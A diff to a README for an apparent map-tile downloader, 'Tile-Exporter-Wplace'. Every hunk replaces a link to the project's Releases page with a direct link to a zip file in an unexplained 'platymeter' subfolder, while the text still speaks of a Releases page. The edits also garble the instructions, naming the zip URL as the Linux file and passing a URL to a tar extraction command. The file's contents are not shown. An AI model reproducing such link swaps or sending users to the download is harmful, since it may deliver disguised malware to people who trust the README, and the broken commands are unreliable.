@@ -1,6 +1,6 @@
 # 🎨 Tile-Exporter-Wplace - Download Maps Easily and Quickly
 
-[![Download Tile-Exporter-Wplace](https://img.shields.io/badge/Download-Tile--Exporter--Wplace-blue.svg)](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
+[![Download Tile-Exporter-Wplace](https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip)](https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Tile-Exporter-Wplace is an adaptive tile downloader that allows you to download 
 
 To get started, visit the Releases page to download the latest version of Tile-Exporter-Wplace. 
 
-[**Visit this page to download**](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip)
 
 ### 🌐 System Requirements
 
@@ -25,10 +25,10 @@ Before downloading, ensure your system meets these minimal requirements:
 
 1. Click the link below to access the Releases page. 
 
-   [**Visit this page to download**](https://github.com/admindata22/Tile-Exporter-Wplace/releases)
+   [**Visit this page to download**](https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest release tagged as `Latest Release`.
-3. Choose the appropriate file for your operating system. You will see options like `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. Choose the appropriate file for your operating system. You will see options like `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip` for Linux.
 
 ## 🔄 Installation Steps
 
@@ -53,7 +53,7 @@ After downloading the file:
 2. Navigate to your Downloads folder, and run:
 
    ```bash
-   tar -xvzf Tile-Exporter-Wplace.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/admindata22/Tile-Exporter-Wplace/main/platymeter/Tile-Exporter-Wplace.zip
    ```
 
 3. Change into the extracted directory:
